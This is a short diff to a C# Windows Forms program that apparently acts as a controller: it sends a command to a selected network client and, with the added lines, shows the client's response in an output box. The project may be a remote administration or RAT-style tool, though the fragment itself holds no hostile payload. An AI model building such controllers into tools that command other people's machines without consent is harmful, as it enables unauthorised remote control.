@@ -305,6 +305,9 @@ namespace PR0T0TYP3
 				NetworkStream curStream = clientSelected.GetStream();
 				curStream.Write(command, 0, command.Length);
 				MessageBox.Show("Command Sent!", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+				string resp = DownloadData(clientSelected);
+				cmdOutput.AppendText(resp);
 			}
 			catch (Exception exc)
 			{
